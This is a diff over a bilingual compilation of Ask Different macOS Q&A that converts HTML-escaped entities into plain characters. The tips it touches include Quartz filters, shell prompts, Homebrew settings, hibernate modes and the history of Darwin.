-                    &lt;real&gt;0.75&lt;/real&gt;
-                    &lt;key&gt;ImageScaleInterpolate&lt;/key&gt;
-                    &lt;true/&gt;
-    &lt;!-- ====== Set what sizes your images can reach ======= --&gt;                    
-                    &lt;key&gt;ImageSizeMax&lt;/key&gt;
-                    &lt;integer&gt;1684&lt;/integer&gt;
-                    &lt;key&gt;ImageSizeMin&lt;/key&gt;
-                    &lt;integer&gt;1200&lt;/integer&gt;
-                &lt;/dict&gt;
-            &lt;/dict&gt;
-        &lt;/dict&gt;
-    &lt;/dict&gt;
-    &lt;key&gt;FilterType&lt;/key&gt;
-    &lt;integer&gt;1&lt;/integer&gt;
-    &lt;key&gt;Name&lt;/key&gt;
-&lt;!-- ====== Set unique display name for your filter ======= --&gt;
-    &lt;string&gt;Reduce Size Good Quality&lt;/string&gt;
-&lt;/dict&gt;
-&lt;/plist&gt;
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Domains</key>
+    <dict>
+        <key>Applications</key>
+        <true/>
+        <key>Printing</key>
+        <true/>
+    </dict>
+    <key>FilterData</key>
+    <dict>
+        <key>ColorSettings</key>
+        <dict>
+            <key>DocumentColorSettings</key>
+            <dict>
+                <key>CustomLHSCorrection</key>
+                <array>
+                    <integer>8</integer>
+                    <integer>8</integer>
+                    <integer>8</integer>
+                </array>
+            </dict>
+            <key>ImageSettings</key>
+            <dict>
+                <key>Compression Quality</key>
+    <!-- ====== Set your custom quality <0,1> ======= -->
+                <real>0.75</real>
+                <key>ImageCompression</key>
+                <string>ImageJPEGCompress</string>
+                <key>ImageScaleSettings</key>
+                <dict>
+                    <key>ImageScaleFactor</key>
+    <!-- ====== Set your scale factor <0,1> ======= -->                 
+                    <real>0.75</real>
+                    <key>ImageScaleInterpolate</key>
+                    <true/>
+    <!-- ====== Set what sizes your images can reach ======= -->                    
+                    <key>ImageSizeMax</key>
+                    <integer>1684</integer>
+                    <key>ImageSizeMin</key>
+                    <integer>1200</integer>
+                </dict>
+            </dict>
+        </dict>
+    </dict>
+    <key>FilterType</key>
+    <integer>1</integer>
+    <key>Name</key>
+<!-- ====== Set unique display name for your filter ======= -->
+    <string>Reduce Size Good Quality</string>
+</dict>
+</plist>
 
 Result
 Select your new filter when exporting file.
@@ -4547,18 +4547,18 @@ Tags: macos, google-calendar | Score: 115 | Views: 638088 | Answers: 6
 Here's another way, adding Google Calendar as a Chrome App with standalone window. The calendar is then available in Launchpad and the Dock.
 
 Navigate Chrome to your calendar URL, e.g https://calendar.google.com
-Create Chrome App shortcut from the URL - Chrome drop down menu (3 dots icon on top right) &gt; Save and Share &gt; Create Shortcut
+Create Chrome App shortcut from the URL - Chrome drop down menu (3 dots icon on top right) > Save and Share > Create Shortcut
 
 
 
-Note: check the &quot;Open as window&quot; box
+Note: check the "Open as window" box
 
 
-Open the &quot;Google Calendar&quot; from Chrome Apps or Launchpad!
+Open the "Google Calendar" from Chrome Apps or Launchpad!
 
 
 
-Select &quot;Keep in Dock&quot; to keep the calendar icon in the MacOS Dock (optional)
+Select "Keep in Dock" to keep the calendar icon in the MacOS Dock (optional)
 
 
 That's it! Your Google Calendar App is now available as a standalone window app from the MacOS Dock and Launchpad.
@@ -4577,7 +4577,7 @@ Managed to solve it.
 Eject the VirtualBox image from: Finder > Devices
 
 
-Now allow the exception in: System Preferences > Security &amp; Privacy
+Now allow the exception in: System Preferences > Security & Privacy
 
 
 Finally but not least click Allow button so that way the developer with the name "Oracle America, Inc" will be accepted and the installer using that certificate will run just fine (basically this installer is signed using "Oracle America, Inc" certificate so we are required to enable it use on our machine first)
@@ -4617,7 +4617,7 @@ defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool Max" 58
 defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool Min" 48
 
 
-EDIT 3 (2015-9-08): Alright. I'm sorry I keep updating this answer, but I keep finding more information about this issue (since improving bluetooth audio on Yosemite is a long-term effort, apparently). I've found several sources that cut straight to the mustard and set everything to 80 which appears to be the maximum allowable value for Bitpool settings. If the above settings don't work well enough for you, try the "All In&trade;" approach.
+EDIT 3 (2015-9-08): Alright. I'm sorry I keep updating this answer, but I keep finding more information about this issue (since improving bluetooth audio on Yosemite is a long-term effort, apparently). I've found several sources that cut straight to the mustard and set everything to 80 which appears to be the maximum allowable value for Bitpool settings. If the above settings don't work well enough for you, try the "All In™" approach.
 
 defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Max (editable)" 80 
 defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Min (editable)" 80 
@@ -4660,14 +4660,14 @@ To assign a keyboard shortcut for performing a secondary click at the current co
 
 Use a private.xml like this with Karabiner:
 
-&lt;?xml version="1.0"?&gt;
-&lt;root&gt;
-  &lt;item&gt;
-    &lt;name&gt;Right Mousebutton&lt;/name&gt;
-    &lt;identifier&gt;rightMouseButton&lt;/identifier&gt;
-    &lt;autogen&gt;__KeyToKey__ KeyCode::OPTION_R, PointingButton::RIGHT&lt;/autogen&gt;
-  &lt;/item&gt;
-&lt;/root&gt;
+<?xml version="1.0"?>
+<root>
+  <item>
+    <name>Right Mousebutton</name>
+    <identifier>rightMouseButton</identifier>
+    <autogen>__KeyToKey__ KeyCode::OPTION_R, PointingButton::RIGHT</autogen>
+  </item>
+</root>
 
 Use BetterTouchTool:
 
@@ -4723,7 +4723,7 @@ export ENV_VAR=12345
 
 You can do this without even having to edit this file if you like, using the following one-liner:
 
-$ echo 'export ENV_VAR=12345' &gt;&gt; ~/.bash_profile
+$ echo 'export ENV_VAR=12345' >> ~/.bash_profile
 
 
 And then confirm like so:
@@ -4745,7 +4745,7 @@ Zsh
 
 If you find that you're using an alternative shell such as zsh, that uses a different set of configuration files maintained within your home directory, ~. Luckily the syntax of the changes is basically the same, just different files. So you can add the above example to this file instead:
 
-$ echo 'export ENV_VAR=12345' &gt;&gt; ~/.zshenv
+$ echo 'export ENV_VAR=12345' >> ~/.zshenv
 
 
 And then when you launch a zsh:
@@ -4916,8 +4916,8 @@ Unzip it (double-click it).
 Open the folder that appears.
 Select all the .TTF files inside the folder.
 With the files selected, right-click.
-From the pop-up menu, choose &quot;open with → Font Book&quot;.
-Click &quot;Install Font&quot; for each font.
+From the pop-up menu, choose "open with → Font Book".
+Click "Install Font" for each font.
 
 Note: Changes to fonts take effect when an application is opened or a user logs in to the account or computer on which the changes occurred, see support.apple.com.
 
@@ -4959,7 +4959,7 @@ That should do it.
 
 ---
 
-#### 180. OS X Terminal &quot;must have&quot; utilities
+#### 180. OS X Terminal "must have" utilities
 
 **问题描述 / Problem Description**:
 Tags: macos, mac, terminal, utilities | Score: 109 | Views: 199906 | Answers: 25
@@ -4971,7 +4971,7 @@ The missing package manager for OS X.
 
 It is an amazing package manager, very light and easy to use. KIS Principle, that makes me think of archlinux. Its community is big and very active.
 (see also macports which brew doesn't replace completely, I prefer installing packages with brew, but some complex ones are only on macports)
-See also brew tap command which provides some missing formulas that can be useful like when you need latest php version &gt; brew tap josegonzalez/php.
+See also brew tap command which provides some missing formulas that can be useful like when you need latest php version > brew tap josegonzalez/php.
 (Homebrew has a policy of not replacing system components, but hey, sometimes you have to)
 
 ---
@@ -4983,7 +4983,7 @@ Tags: macos, mac, sleep-wake | Score: 109 | Views: 79405 | Answers: 4
 
 **解决方案 / Solution**:
 Actually, something like
-pmset -g log|grep -e &quot; Sleep  &quot; -e &quot; Wake  &quot;
+pmset -g log|grep -e " Sleep  " -e " Wake  "
 
 is what really gives me a clean timeline of sleep/wake events on 10.8.2. powerd does not log anything about it, at least on my system (10.8.2, MacBook Pro Retina 15).
 02/03/13 19:48:37 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              26 secs   
@@ -5024,13 +5024,13 @@ Disclaimer: I made the application. I had similar problems with both Bluetooth h
 
 ---
 
-#### 183. How can I make all folders in Finder &quot;snap to grid&quot;?
+#### 183. How can I make all folders in Finder "snap to grid"?
 
 **问题描述 / Problem Description**:
 Tags: macos, finder | Score: 108 | Views: 171654 | Answers: 3
 
 **解决方案 / Solution**:
-The following steps applied &quot;Snap to Grid&quot; even for previously created folders.
+The following steps applied "Snap to Grid" even for previously created folders.
 Tested on:
 
 10.6.x
@@ -5045,12 +5045,12 @@ Tested on:
 Go to any folder control
 Control click on the empty space
 Click on Show View Options
-In the &quot;Sort by&quot; drop down bar select &quot;Snap to Grid&quot;
-At the bottom of the window click on the &quot;Use as Defaults&quot;
+In the "Sort by" drop down bar select "Snap to Grid"
+At the bottom of the window click on the "Use as Defaults"
 button
 
 NOTE: Because this will become the default setup for ALL Finder windows you may consider manipulating the Icon size, Grid spacing, Text size, Label position, Background, etc... accordingly.
-ALSO: If folders do not appear to have snapped to grid on a previously created folder, Relaunch Finder or you could try to toggle the &quot;Icon size&quot; down and back up too refresh the current window.
+ALSO: If folders do not appear to have snapped to grid on a previously created folder, Relaunch Finder or you could try to toggle the "Icon size" down and back up too refresh the current window.
 This is where it is on 10.15 Catalina:
 
 ---
@@ -5097,7 +5097,7 @@ In iTerm2, disable their middle-click in Preferences, otherwise you'll get doubl
 
 ---
 
-#### 187. Is there the dark mode (inverted colors) in the &#39;Preview&#39; Application for PDF reading?
+#### 187. Is there the dark mode (inverted colors) in the 'Preview' Application for PDF reading?
 
 **问题描述 / Problem Description**:
 Tags: macos, pdf, preview, dark-mode | Score: 106 | Views: 131722 | Answers: 8
@@ -5194,7 +5194,7 @@ But I agree with you that it would be more symmetrical to be able to click to mi
 
 ---
 
-#### 194. Isn&#39;t Inactive memory a waste of resources?
+#### 194. Isn't Inactive memory a waste of resources?
 
 **问题描述 / Problem Description**:
 Tags: macos, mac, memory | Score: 104 | Views: 57563 | Answers: 7
@@ -5257,7 +5257,7 @@ While this doesn't give a browsable directory from the root directory down, I've
 
 ---
 
-#### 196. Do MacBooks have a true &quot;Hibernate&quot; option?
+#### 196. Do MacBooks have a true "Hibernate" option?
 
 **问题描述 / Problem Description**:
 Tags: macos, macbook-pro, hibernate | Score: 104 | Views: 129318 | Answers: 4
@@ -5296,7 +5296,7 @@ Some newer Macs support a standby mode on 10.8 and later. Even if hibernatemode 
 
 ---
 
-#### 197. Why doesn&#39;t Mac OS X source ~/.bashrc?
+#### 197. Why doesn't Mac OS X source ~/.bashrc?
 
 **问题描述 / Problem Description**:
 Tags: macos, terminal, bash, command-line | Score: 104 | Views: 183444 | Answers: 2
@@ -5354,13 +5354,13 @@ A nicer and paid solution is Rogue Amoeba's SoundSource
 
 ---
 
-#### 201. Why won&#39;t closing the lid sleep my MacBook Pro with external monitor attached after upgrading to Lion?
+#### 201. Why won't closing the lid sleep my MacBook Pro with external monitor attached after upgrading to Lion?
 
 **问题描述 / Problem Description**:
 Tags: macbook-pro, macos, sleep-wake | Score: 103 | Views: 105833 | Answers: 9
 
 **解决方案 / Solution**:
-edit: See this as the behaviour has changed: Why won&#39;t closing the lid sleep my MacBook Pro with external monitor attached after upgrading to Lion?
+edit: See this as the behaviour has changed: Why won't closing the lid sleep my MacBook Pro with external monitor attached after upgrading to Lion?
 
 There are two groups of people. Those who wish to have dual displays and have closing the lid go into sleep and people who wish to disable the monitor display, close the lid and use the external monitor as if you had 'docked' with it.
 
@@ -5396,7 +5396,7 @@ Right now, there is no way to alter this behaviour.
 Tags: macos, spotlight | Score: 102 | Views: 33053 | Answers: 5
 
 **解决方案 / Solution**:
-Go to System Preferences --&gt; Spotlight --&gt; Privacy. While that's open, go to Finder --&gt; Applications and drag Matlab from Applications into Privacy. Close out System Preferences then reopen it and remove Matlab from the same place. 
+Go to System Preferences --> Spotlight --> Privacy. While that's open, go to Finder --> Applications and drag Matlab from Applications into Privacy. Close out System Preferences then reopen it and remove Matlab from the same place. 
 
 This will force a reindex for Spotlight. I've seen this work for some people and not for others but it's worth a shot.
 
@@ -5443,7 +5443,7 @@ Tags: macos, keyboard, mouse, ui | Score: 101 | Views: 42512 | Answers: 7
 **解决方案 / Solution**:
 Enable Keyboard Control of the UI
 
-System Prefs &gt; Keyboard &gt; Shortcuts
+System Prefs > Keyboard > Shortcuts
 
 
 Then select "All Controls" radio button at the bottom, rather than just "Text boxes and lists only".
@@ -5453,10 +5453,10 @@ Then select "All Controls" radio button at the bottom, rather than just "Text bo
 Keyboard Shortcuts
 
 
-&#x21E5; (TAB) will move between buttons.
+⇥ (TAB) will move between buttons.
 esc (ESC) is cancel.
 space (SPACE) selects the active button (blue, outline).
-&#x21A9; (RETURN) is OK or the default button (blue, pulsing, filled).
+↩ (RETURN) is OK or the default button (blue, pulsing, filled).
 For some dialog boxes, ⌘+first_letter will select the button with a certain first letter in the text (as pointed out by @Griffo).
 
 ---
@@ -5468,14 +5468,14 @@ Tags: macos, terminal | Score: 101 | Views: 197003 | Answers: 9
 
 **解决方案 / Solution**:
 Change your prompt in your ~/.bashrc file. The example you asked for would be:
-export PS1=&quot;\W \$&quot;
+export PS1="\W \$"
 
 It would result in the current folder you're in being shown plus a $ for the regular prompt and a # if you're root. Check out this guide for more examples of what you could show in your prompt.
 Edit:
 As per one of the comments below, you might need to source your ~/.bashrc from your ~/.bash_profile or even put this code in your ~/.bash_profile instead. You can read this article for a better explanation on which file to use.
 If you are NOT using BASH but ZSH, do the following:
 (1) nano ~/.zshrc,
-(2) add this line at the end of the file export PS1=&quot;\$ &quot;,
+(2) add this line at the end of the file export PS1="\$ ",
 (3) save the file, ~/.zshrc,
 (4) source the zshrc to apply the change with source ~/.zshrc.
 (5) You should be good at this point!
@@ -5496,7 +5496,7 @@ Original files can be found at /Library/User Pictures if you're looking for an A
 
 If you wish to extract a version of your account picture you can do so by running the following command
 
-dscl . -read /Users/${USER} JPEGPhoto | tail -1 | xxd -r -p &gt; ${HOME}/Desktop/accountImage.jpg
+dscl . -read /Users/${USER} JPEGPhoto | tail -1 | xxd -r -p > ${HOME}/Desktop/accountImage.jpg
 
 
 The resolution can vary, depending on the original size of the photo and what version of the operating system you're using when it is saved.
@@ -5538,13 +5538,13 @@ If you have other problems remember, the brew doctor can help you!
 
 ---
 
-#### 208. What is &quot;photoanalysisd&quot; and why is it using 77% of my CPU?
+#### 208. What is "photoanalysisd" and why is it using 77% of my CPU?
 
 **问题描述 / Problem Description**:
 Tags: macos, photos.app, cpu | Score: 100 | Views: 313432 | Answers: 9
 
 **解决方案 / Solution**:
-Update for 2019, 16&quot; MacBook Pro running Catalina 10.15.2:
+Update for 2019, 16" MacBook Pro running Catalina 10.15.2:
 
 start Photos, let it continue past the first dialogue box;
 
@@ -5570,7 +5570,7 @@ This is actually a feature of the filesystem of your disk, not bash or Terminal.
 HFS+ (the Mac filesystem) is usually configured to be case insensitive but case preserving. This means that the file system will consider foo and FoO to be the same, but when you create a new file it will remember which letters where capitalized and which were not.
 When you format a disk with HFS+ you can chose whether the file system should case sensitive or not. If you chose to format with UFS (Unix FileSystem) it is always case sensitive, AFAIK.
 To check whether a disk is case sensitive, run:
- diskutil info &lt;device&gt;
+ diskutil info <device>
 
 For example:
  diskutil info disk0s2
@@ -5580,7 +5580,7 @@ Look for the Name: line. If it reads something like Mac OS Extended (Case-sensit
 Since macOS 10.13, the default Apple file system is now APFS which is case-insensitive but case-preserving by default. Like HFS+, it can also be formatted to be case-sensitive. To see which mode is used you now have to use:
 diskutil ap list
 
-(diskutil info &lt;device&gt; does not print whether an APFS slice is case-sensitive or not.)
+(diskutil info <device> does not print whether an APFS slice is case-sensitive or not.)
 
 ---
 
@@ -5605,7 +5605,7 @@ For this process, find the PID number.
 Then, within terminal, type this:
 ps aux | grep 20295
 
-note that you should change &quot;20295&quot; to the PID number that you found in step 3
+note that you should change "20295" to the PID number that you found in step 3
 
 
 This should give you the information as to which extension it is. I, personally, would remove it, but that's up to you. At the very least, please contact the maintainer of that package and make sure that they are aware of the issue.
@@ -5642,7 +5642,7 @@ Tags: macos, keyboard, system-settings, preferences | Score: 99 | Views: 153925 
 **解决方案 / Solution**:
 Well I actually just figured this out.  In Preferences under Mission Control there were two options set to use the F11 and F12 keys.  I set these to '-' and that fixed the issue.  The options that were set to use these function keys are highlighted in the screenshot below.
 
-2024 Note: MacOS Sonoma 14.3.1 this config option has moved: System Settings →  Desktop &amp; Dock →  Keyboard and Mouse Shortcut →  Show Desktop
+2024 Note: MacOS Sonoma 14.3.1 this config option has moved: System Settings →  Desktop & Dock →  Keyboard and Mouse Shortcut →  Show Desktop
 
 ---
 
@@ -5667,7 +5667,7 @@ The default shell can also be changed from System Preferences or with dscl, but 
 
 ---
 
-#### 214. Is it &#39;OK&#39; to use the root user as a normal user?
+#### 214. Is it 'OK' to use the root user as a normal user?
 
 **问题描述 / Problem Description**:
 Tags: macos, user-account, root | Score: 97 | Views: 54074 | Answers: 10
@@ -5698,7 +5698,7 @@ If you have automatic checking for updates turned on, this might not work for yo
 Re-running the update checker should undo this. One might be able to find that .plist (I believe it was in /Users/[username]/Library/Preferences/com.apple.systempreferences.plist) and set the immutable bit on it/give it read only permissions to prevent it getting modified, but I have no idea what the fallout from that could be. You'd probably not be able to change any other per-user settings anymore.
 
 Edit: Some have suggested setting it like:
-defaults write com.apple.systempreferences AttentionPrefBundleIDs '{ &quot;com.apple.preferences.softwareupdate&quot; = 0; }'
+defaults write com.apple.systempreferences AttentionPrefBundleIDs '{ "com.apple.preferences.softwareupdate" = 0; }'
 
 instead. This seems to work, and is the default value on a fresh install, at least for some newer versions - but it is also more difficult to type and ultimately has the same impact, so I still just use the top version and have noticed no ill effects.
 
@@ -5756,21 +5756,21 @@ Or if you are in the terminal press CmdT to open a new tab OR CmdN to open a new
 
 ---
 
-#### 220. This copy of the Install OS X El Capitan application can&#39;t be verified. It may have been corrupted or tampered with during downloading
+#### 220. This copy of the Install OS X El Capitan application can't be verified. It may have been corrupted or tampered with during downloading
 
 **问题描述 / Problem Description**:
 Tags: macos, install | Score: 95 | Views: 326245 | Answers: 13
 
 **解决方案 / Solution**:
 To save having to scroll right down to the newest answer to find this info…
-Apple rebuilt all the installers in about 2020 to fix this issue once &amp; for all - see Apple KB - How to Download macOS
+Apple rebuilt all the installers in about 2020 to fix this issue once & for all - see Apple KB - How to Download macOS
 
 Follow this tutorial. This applies to the reply from @Cazuma Nii Cavalcanti. In short once you are at the first install page go to tools in the nav bar and open the terminal, in the terminal type date MMDDHHmmYY replacing the letters as follows.
 MM - 2 digit month  01 - 12
 DD - 2 digit date   01 - 31
 HH - 2 digit hour   01 - 24
 mm - 2 digit minute 01 - 59
-YY - 2 digit year   &gt; 15
+YY - 2 digit year   > 15
 
 once that is done go through the install normally. I just tried it and it worked with a USB install of OS X (10.11 - El Capitan) and it worked like a charm!
 If setting to correct date doesn't work. Set to a date just after the os release.
@@ -5783,7 +5783,7 @@ If setting to correct date doesn't work. Set to a date just after the os release
 Tags: macos, finder | Score: 95 | Views: 50498 | Answers: 2
 
 **解决方案 / Solution**:
-Instead of &#x2318;+I use &#x2318;+&#x2325;+I to see the info:
+Instead of ⌘+I use ⌘+⌥+I to see the info:
 
 
 
@@ -5798,7 +5798,7 @@ Tags: macos, command-line, homebrew | Score: 95 | Views: 67340 | Answers: 3
 
 **解决方案 / Solution**:
 According to this github issue and to the man page, the environment variable HOMEBREW_NO_AUTO_UPDATE can be set to 1.
-HOMEBREW_NO_AUTO_UPDATE=1 brew install &lt;formula&gt;
+HOMEBREW_NO_AUTO_UPDATE=1 brew install <formula>
 
 This will stop the homebrew update for this command. If you want to prevent auto update for your shell session, use:
 export HOMEBREW_NO_AUTO_UPDATE=1
@@ -5819,7 +5819,7 @@ touch -t $(date -jf %FT%T 1999-12-31T23:59:59 +%Y%m%d%H%M%S) file.txt
 
 SetFile -d always changes the creation time.
 SetFile -d '12/31/1999 23:59:59' file.txt
-SetFile -d &quot;$(GetFileInfo -m test.txt)&quot; file.txt
+SetFile -d "$(GetFileInfo -m test.txt)" file.txt
 
 SetFile is part of the command line tools package which can be installed using xcode-select --install or downloaded from developer.apple.com/downloads or from Xcode's preferences.
 
@@ -5837,7 +5837,7 @@ From man pmset:
 
 hibernatemode = 0 (binary 0000) by default on supported desktops. The system will not back memory up to persistent storage. The system must wake from the contents of memory; the system will lose context on power loss. This is, historically, plain old sleep.
 hibernatemode = 3 (binary 0011) by default on supported portables. The system will store a copy of memory to persistent storage (the disk), and will power memory during sleep. The system will wake from memory, unless a power loss forces it to restore from disk image.
-hibernatemode = 25 (binary 0001 1001) is only settable via pmset. The system will store a copy of memory to persistent storage (the disk), and will remove power to memory. The system will restore from disk image. If you want &quot;hibernation&quot; - slower sleeps, slower wakes, and better battery life, you should use this setting.
+hibernatemode = 25 (binary 0001 1001) is only settable via pmset. The system will store a copy of memory to persistent storage (the disk), and will remove power to memory. The system will restore from disk image. If you want "hibernation" - slower sleeps, slower wakes, and better battery life, you should use this setting.
 
 
 0 (traditional sleep mode) enables fast wake up and sleep, saves disk space, and reduces writing to the drive.
@@ -5848,7 +5848,7 @@ I used hibernatemode 0 with my MacBook Air. Even if the MacBook Air went to slee
 
 ---
 
-#### 225. MacBook unplugged from external monitor thinks it&#39;s still the Secondary Desktop
+#### 225. MacBook unplugged from external monitor thinks it's still the Secondary Desktop
 
 **问题描述 / Problem Description**:
 Tags: macbook-pro, display | Score: 94 | Views: 90132 | Answers: 5
@@ -5871,7 +5871,7 @@ From the  menu in the top left corner of the screen, select System Preference
 
 Click the + button to add a new shortcut
 
-Select &quot;Terminal.app&quot; for the application, and for the command, type Close (this is case sensitive). You must provide a keybinding, but it doesn't have to be the default. In the shortcut box, give it a different shortcut, like ⌘ControlW 
+Select "Terminal.app" for the application, and for the command, type Close (this is case sensitive). You must provide a keybinding, but it doesn't have to be the default. In the shortcut box, give it a different shortcut, like ⌘ControlW 
 
 Now ⌘W will not close your terminal windows.
 
@@ -5893,7 +5893,7 @@ There is a utility (in Applications/Utilities) called Digital Color Meter, which
 Tags: macos, command-line, bash | Score: 93 | Views: 79834 | Answers: 19
 
 **解决方案 / Solution**:
-(svn update . &amp;&amp; ant clean build start &amp;&amp; say done) || say error
+(svn update . && ant clean build start && say done) || say error
 
 ---
 
@@ -5950,8 +5950,8 @@ $ sudo bclm write 100
 Notes:
 
 It might be better if you set it even lower, for example, 60% or 70%. Then, before you need to use it on battery for a long time, bclm write 100. You can automate this switching between 80% and full using launchd (read man launchd.plist).
-macOS show charge approximately 3-5% greater than the real value, so it may feel like the tool is not working initially. Use coconutbattery (GUI) or ioreg -l | awk '$3~/Capacity/{c[$3]=$5}END{OFMT=&quot;%.3f&quot;;max=c[&quot;\&quot;MaxCapacity\&quot;&quot;];print(max&gt;0?100*c[&quot;\&quot;CurrentCapacity\&quot;&quot;]/max:&quot;?&quot;)}'[1] to calculate real battery charge level.
-If you are using macOS Catalina or higher, you need to turn off the &quot;Optimised battery charging&quot; function for the tool to work properly, otherwise, the value you set might be overwritten.
+macOS show charge approximately 3-5% greater than the real value, so it may feel like the tool is not working initially. Use coconutbattery (GUI) or ioreg -l | awk '$3~/Capacity/{c[$3]=$5}END{OFMT="%.3f";max=c["\"MaxCapacity\""];print(max>0?100*c["\"CurrentCapacity\""]/max:"?")}'[1] to calculate real battery charge level.
+If you are using macOS Catalina or higher, you need to turn off the "Optimised battery charging" function for the tool to work properly, otherwise, the value you set might be overwritten.
 There is also a GUI version: charge-limiter. Both work by setting the BCLM key in SMC to a custom value.
 
 For Apple Silicon Macs and macOS 11 (Big Sur) and higher, use AlDente.
@@ -5975,10 +5975,10 @@ Once you’ve downloaded Mavericks, find the installer on your Mac. It’s calle
 
 Right-click (or Control+click) the installer, and choose Show Package Contents from the resulting contextual menu.
 
-In the folder that appears, open Contents &gt; Shared Support; you’ll see a disk image file called InstallESD.dmg
+In the folder that appears, open Contents > Shared Support; you’ll see a disk image file called InstallESD.dmg
 This dmg file is in essence an ISO file in s slightly different format.  We'll need to convert it.  Open up Disk Utility and:
 
-From the menu bar, select Images &gt; Convert and point it to your .dmg file
+From the menu bar, select Images > Convert and point it to your .dmg file
 
 In the Save As dialog that follows, select DVD/CD master. Disk Utility will insist on saving the new ISO as a .cdr file, but it is really an ISO.
 
@@ -6074,7 +6074,7 @@ Tags: itunes, music, macos | Score: 91 | Views: 89523 | Answers: 11
 
 **解决方案 / Solution**:
 There are very specific triggers to start the app and playback.
-I have had this experience and I discovered that my finger was lightly brushing the &quot;Play&quot; button on the MacBook Pro's Touch Bar. If the current app has no hook for that button, it seems that macOS now chooses to launch the Music app.
+I have had this experience and I discovered that my finger was lightly brushing the "Play" button on the MacBook Pro's Touch Bar. If the current app has no hook for that button, it seems that macOS now chooses to launch the Music app.
 The solution should be to run:
 launchctl unload -w /System/Library/LaunchAgents/com.apple.rcd.plist
 
@@ -6108,7 +6108,7 @@ Xcode 4.2 and earlier came with a separate application for editing property list
 
 ---
 
-#### 239. Why is macOS often referred to as &#39;Darwin&#39;?
+#### 239. Why is macOS often referred to as 'Darwin'?
 
 **问题描述 / Problem Description**:
 Tags: macos, darwin | Score: 90 | Views: 59658 | Answers: 6
@@ -6118,18 +6118,18 @@ Why is macOS often referred to as 'Darwin'?
 
 It isn't. macOS isn't Darwin and Darwin isn't macOS.
 The history of macOS is long, convoluted, and complicated.
-It starts with Steve Jobs (not entirely voluntary) &quot;leaving&quot; Apple and founding NeXT. NeXT wanted to revolutionize the Personal Workstation. They built both a powerful computer, the NeXT Computer (later NeXTstation and NeXTcube), and a powerful, modern Operating System, called NeXTStep. (Get it? The next step for the next computer. Really creative naming.)
-The Operating System was based on porting BSD to a Mach microkernel, and adding object-oriented system libraries, frameworks, and toolkits (called &quot;kits&quot;, which you can still see in Apple's naming today), with an object-oriented GUI framework and desktop, with object-oriented applications, all written in a modern object-oriented programming language (Objective-C) as the systems language, on top of the base BSD system. The display system was based on PostScript, and there was even an Intel i860 coprocessor running a stripped-down version of the OS, only for Display PostScript processing, plus a powerful DSP for video and audio processing.
+It starts with Steve Jobs (not entirely voluntary) "leaving" Apple and founding NeXT. NeXT wanted to revolutionize the Personal Workstation. They built both a powerful computer, the NeXT Computer (later NeXTstation and NeXTcube), and a powerful, modern Operating System, called NeXTStep. (Get it? The next step for the next computer. Really creative naming.)
+The Operating System was based on porting BSD to a Mach microkernel, and adding object-oriented system libraries, frameworks, and toolkits (called "kits", which you can still see in Apple's naming today), with an object-oriented GUI framework and desktop, with object-oriented applications, all written in a modern object-oriented programming language (Objective-C) as the systems language, on top of the base BSD system. The display system was based on PostScript, and there was even an Intel i860 coprocessor running a stripped-down version of the OS, only for Display PostScript processing, plus a powerful DSP for video and audio processing.
 NeXTStep pioneered many things we see in modern GUI programming. It had one of the first graphical GUI Builders, which still to this day is how you design GUIs for macOS, iOS, iPadOS, etc. (Today, it is called the Xcode Interface Builder.) It had the first ever App Store. When Tim Berners-Lee invented the World Wide Web, he chose NeXTStep as the OS to write the first browser for. Many game studios used NeXTStep and NeXT workstations for their development, e.g. id software for Doom, Doom 2, and Quake. Lotus Improv, still considered by many to be miles ahead of Excel even now, was implemented on NeXTStep.
-Later, NeXT divorced the higher-level frameworks from the underlying OS and made them available under the name OpenStep for Windows NT, Sun Solaris, and under the name &quot;OPENSTEP for Mach&quot; still based on the same underpinnings as the original NeXTStep.
-At this point, Apple had tried and failed multiple times to modernize MacOS, and they bought NeXT (thus bringing Steve Jobs back into the company) and all of its Intellectual Property and technology to develop a successor to MacOS based on OPENSTEP for Mach. They modernized the Mach kernel from 2.5 to 3 and extended it with concepts from the FreeBSD kernel to form a kernel known as xnu (a reference to the failed nuKernel project at Apple which was to develop a &quot;new kernel&quot;), and the BSD underpinnings from 4.3BSD to 4.4BSD and later FreeBSD.
-Most importantly, they extended and expanded the OpenStep APIs and built new APIs on top. The collection of those APIs is known as &quot;Cocoa&quot;. They also built an API called &quot;Carbon&quot;, which was a close, but not identical re-implementation of a subset of the MacOS API on top of the new foundations. (The intention was that while it would not be possible to simply re-compile existing MacOS applications, it should be fairly easy to port them to Carbon, and then over the years rewrite them in Cocoa.)
+Later, NeXT divorced the higher-level frameworks from the underlying OS and made them available under the name OpenStep for Windows NT, Sun Solaris, and under the name "OPENSTEP for Mach" still based on the same underpinnings as the original NeXTStep.
+At this point, Apple had tried and failed multiple times to modernize MacOS, and they bought NeXT (thus bringing Steve Jobs back into the company) and all of its Intellectual Property and technology to develop a successor to MacOS based on OPENSTEP for Mach. They modernized the Mach kernel from 2.5 to 3 and extended it with concepts from the FreeBSD kernel to form a kernel known as xnu (a reference to the failed nuKernel project at Apple which was to develop a "new kernel"), and the BSD underpinnings from 4.3BSD to 4.4BSD and later FreeBSD.
+Most importantly, they extended and expanded the OpenStep APIs and built new APIs on top. The collection of those APIs is known as "Cocoa". They also built an API called "Carbon", which was a close, but not identical re-implementation of a subset of the MacOS API on top of the new foundations. (The intention was that while it would not be possible to simply re-compile existing MacOS applications, it should be fairly easy to port them to Carbon, and then over the years rewrite them in Cocoa.)
 The first prototype of this system was called Rhapsody. The full system wasn't finished in time, so a subset was released as MacOS X Server 1.0. And the rest is history: Rhapsody became MacOS X, then OS X, then macOS, and somewhere along the way, iOS was split off, and then further divided into iOS, iPadOS, tvOS, and watchOS.
 Now, back to Darwin: Darwin is basically the underpinnings of macOS, from the xnu kernel, IOKit, drivers, etc. up to the BSD libraries and userland, plus some macOS-specific developments such as mDNSresponder and launchd. It does not, however, include any parts of what used to be OpenStep, Cocoa, Aqua, Quartz, QuickTime, or any of the other higher-level stuff. It does contain drivers and filesystems, although I am not entirely sure whether APFS is part of Darwin.
